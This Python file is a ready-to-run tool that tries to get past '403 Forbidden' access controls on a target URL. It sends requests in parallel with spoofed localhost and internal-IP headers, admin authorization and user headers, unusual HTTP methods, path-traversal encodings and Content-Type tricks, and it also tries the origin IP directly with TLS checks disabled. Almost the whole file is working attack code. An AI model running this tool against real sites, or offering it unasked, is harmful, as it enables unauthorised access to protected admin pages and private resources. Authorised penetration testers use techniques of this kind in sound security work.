"""
403 Forbidden Bypass Module 2026
Comprehensive bypass techniques: headers, methods, paths, protocols, origin direct.
"""
import asyncio, logging, socket, ssl, random as _random
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse

logger = logging.getLogger(__name__)

# =============================================================================
# 50+ BYPASS HEADERS
# =============================================================================
BYPASS_HEADERS = [
    # Localhost IP headers
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1, 127.0.0.1"},
    {"X-Forwarded-For": "localhost"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Real-IP": "localhost"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Client-IP": "localhost"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"X-Forwarded-For": "10.0.0.1"},
    {"X-Real-IP": "10.0.0.1"},
    {"X-Originating-IP": "10.0.0.1"},
    # Internal network IPs
    {"X-Forwarded-For": "192.168.1.1"},
    {"X-Forwarded-For": "172.16.0.1"},
    {"X-Real-IP": "192.168.1.1"},
    {"X-Forwarded-For": "2130706433"},  # 127.0.0.1 as int
    # Host header manipulation
    {"X-Host": "localhost"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Original-URL": "/"},
    {"X-Rewrite-URL": "/"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Authorization-IP": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1", "X-Originating-IP": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1", "X-Forwarded-Host": "localhost"},
    # Proxy headers
    {"X-ProxyUser-IP": "127.0.0.1"},
    {"X-Proxy-For": "127.0.0.1"},
    {"X-Connection-IP": "127.0.0.1"},
    {"X-Authenticated-User": "admin"},
    {"X-Authenticated-Groups": "admin"},
    {"X-Forwarded-Scheme": "http"},
    {"X-Forwarded-Proto": "http"},
    {"X-Forwarded-Proto": "https"},
    # Cloudflare-specific
    {"CF-IPCountry": "US"},
    {"CF-IPCountry": "KR"},
    {"CF-IPCountry": "CN"},
    # Authorization bypass
    {"Authorization": "Basic YWRtaW46YWRtaW4="},
    {"Authorization": "Bearer admin"},
    # Custom internal headers
    {"X-Internal": "true"},
    {"X-Backend": "true"},
    {"X-Admin": "true"},
    {"X-Debug": "true"},
    {"X-Test": "true"},
    {"X-Override": "true"},
    {"X-Allow": "true"},
    {"X-Forwarded-For": "127.0.0.1", "User-Agent": "Googlebot/2.1"},
    {"User-Agent": "Googlebot/2.1 (+http://www.google.com/bot.html)"},
    {"User-Agent": "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"},
    # Accept-language/encoding bypass
    {"Accept-Language": "en-US,en;q=0.9,id;q=0.8"},
    {"Accept-Encoding": "gzip, deflate, br"},
]

# =============================================================================
# HTTP METHOD OVERRIDES
# =============================================================================
METHOD_OVERRIDES = [
    {"method": "POST", "headers": {"X-HTTP-Method-Override": "GET"}},
    {"method": "GET", "headers": {"X-HTTP-Method-Override": "POST"}},
    {"method": "PUT", "headers": {}},
    {"method": "DELETE", "headers": {}},
    {"method": "PATCH", "headers": {}},
    {"method": "OPTIONS", "headers": {}},
    {"method": "HEAD", "headers": {}},
    {"method": "TRACE", "headers": {}},
    {"method": "PROPFIND", "headers": {}},
    {"method": "MOVE", "headers": {}},
    {"method": "COPY", "headers": {}},
    {"method": "LOCK", "headers": {}},
    {"method": "UNLOCK", "headers": {}},
    {"method": "MKCOL", "headers": {}},
]

# =============================================================================
# PATH MANIPULATIONS
# =============================================================================
PATH_PAYLOADS = [
    "/%2e/%2e%2e/%2e%2e%2e",
    "/..;/..;/..;/",
    "/%2e%2e/%2e%2e/%2e%2e",
    "/.%00/",
    "/..%00/",
    "/%23/",
    "/%2f/",
    "/;/",
    "/..;/",
    "/%2e%2e%2f",
    "/%c0%ae%c0%ae/",
    "/%252e%252e%252f",
    "/..%5c",
    "/%2e%2e%5c",
    "/.../",
    "/....//",
]

# =============================================================================
# PROTOCOL TRICKS
# =============================================================================
PROTOCOL_TRICKS = [
    {"http_version": "HTTP/1.0"},
    {"http_version": "HTTP/1.1"},
]

# =============================================================================
# CONTENT-TYPE BYPASS
# =============================================================================
CONTENT_TYPE_BYPASS = [
    {"Content-Type": "application/x-www-form-urlencoded"},
    {"Content-Type": "multipart/form-data; boundary=----BypassBoundary"},
    {"Content-Type": "application/json"},
    {"Content-Type": "text/plain"},
    {"Content-Type": "application/xml"},
    {"Content-Type": "text/xml"},
]


class ForbiddenBypass:
    """403 Forbidden bypass with 50+ techniques running in parallel."""

    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.results = []

    async def bypass(self, url: str) -> Dict:
        """Try all bypass techniques in parallel, return working methods."""
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path or "/"

        tasks = []
        results = []

        # 1. Header injection bypass
        tasks.append(self._try_headers(url))
        # 2. Method override bypass
        tasks.append(self._try_methods(url))
        # 3. Path manipulation bypass
        tasks.append(self._try_paths(base, path))
        # 4. Protocol tricks
        tasks.append(self._try_protocols(url))
        # 5. Content-Type bypass
        tasks.append(self._try_content_type(url))
        # 6. Direct origin (if provided)
        tasks.append(self._try_origin(url))

        completed = await asyncio.gather(*tasks, return_exceptions=True)
        for result in completed:
            if isinstance(result, list):
                results.extend(result)

        working = [r for r in results if r.get("success")]
        return {
            "bypassed": len(working) > 0,
            "total_tested": len(results),
            "working_count": len(working),
            "working_methods": working[:10],
            "all_results": results,
        }

    async def _try_headers(self, url: str) -> List[Dict]:
        """Try all header injection techniques."""
        results = []
        import httpx

        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            tasks = []
            for h in BYPASS_HEADERS:
                tasks.append(self._test_single(url, "GET", h, client))
            completed = await asyncio.gather(*tasks, return_exceptions=True)
            for c, hdr in zip(completed, BYPASS_HEADERS):
                if isinstance(c, dict) and c.get("success"):
                    results.append(c)
        return results

    async def _try_methods(self, url: str) -> List[Dict]:
        """Try all HTTP method overrides."""
        results = []
        import httpx

        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            tasks = []
            for mo in METHOD_OVERRIDES:
                tasks.append(self._test_single(url, mo["method"], mo["headers"], client))
            completed = await asyncio.gather(*tasks, return_exceptions=True)
            for c, mo in zip(completed, METHOD_OVERRIDES):
                if isinstance(c, dict) and c.get("success"):
                    results.append(c)
        return results

    async def _try_paths(self, base: str, path: str) -> List[Dict]:
        """Try path manipulation bypass."""
        results = []
        import httpx

        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            tasks = []
            for pp in PATH_PAYLOADS:
                test_url = base + pp + path
                tasks.append(self._test_single(test_url, "GET", {}, client))
            completed = await asyncio.gather(*tasks, return_exceptions=True)
            for c, pp in zip(completed, PATH_PAYLOADS):
                if isinstance(c, dict) and c.get("success"):
                    results.append({
                        "technique": "path",
                        "payload": pp,
                        "status": c["status"],
                        "success": True,
                    })
        return results

    async def _try_protocols(self, url: str) -> List[Dict]:
        """Try protocol version tricks."""
        results = []
        import httpx

        for trick in PROTOCOL_TRICKS:
            try:
                async with httpx.AsyncClient(
                    timeout=self.timeout, verify=False,
                    http1=True if "1.0" in trick["http_version"] else True,
                    http2=False,
                ) as client:
                    r = await client.get(url, headers={"User-Agent": "Mozilla/5.0"})
                    if 200 <= r.status_code < 300:
                        results.append({
                            "technique": "protocol",
                            "payload": trick["http_version"],
                            "status": r.status_code,
                            "success": True,
                        })
            except:
                pass
        return results

    async def _try_content_type(self, url: str) -> List[Dict]:
        """Try Content-Type manipulation bypass."""
        results = []
        import httpx

        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            tasks = []
            for ct in CONTENT_TYPE_BYPASS:
                tasks.append(self._test_single(url, "POST", ct, client))
            completed = await asyncio.gather(*tasks, return_exceptions=True)
            for c, ct in zip(completed, CONTENT_TYPE_BYPASS):
                if isinstance(c, dict) and c.get("success") and 200 <= c.get("status", 0) < 300:
                    results.append(c)
        return results

    async def _try_origin(self, url: str) -> List[Dict]:
        """Try direct origin IP bypass (if IP cached)."""
        results = []
        try:
            parsed = urlparse(url)
            ip = socket.gethostbyname(parsed.hostname)
            origin_url = f"{parsed.scheme}://{ip}{parsed.path or '/'}"
            import httpx
            async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
                r = await client.get(origin_url, headers={"Host": parsed.hostname, "User-Agent": "Mozilla/5.0"})
                if 200 <= r.status_code < 300:
                    results.append({
                        "technique": "origin_direct",
                        "payload": ip,
                        "status": r.status_code,
                        "success": True,
                    })
        except:
            pass
        return results

    async def _test_single(self, url: str, method: str, headers: Dict, client) -> Optional[Dict]:
        """Test a single bypass combination."""
        try:
            req_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}
            req_headers.update(headers)

            if method == "GET":
                r = await client.get(url, headers=req_headers, follow_redirects=False)
            elif method == "HEAD":
                r = await client.head(url, headers=req_headers, follow_redirects=False)
            elif method == "OPTIONS":
                r = await client.options(url, headers=req_headers, follow_redirects=False)
            else:
                r = await client.request(method, url, headers=req_headers, follow_redirects=False)

            if 200 <= r.status_code < 300:
                return {
                    "technique": "header" if headers else "method",
                    "method": method,
                    "headers": str({k: v for k, v in headers.items() if k != "User-Agent"})[:80],
                    "status": r.status_code,
                    "success": True,
                }
        except:
            pass
        return None


async def bypass_403(url: str, timeout: int = 10) -> Dict:
    """High-level 403 bypass entry point."""
    fb = ForbiddenBypass(timeout=timeout)
    return await fb.bypass(url)
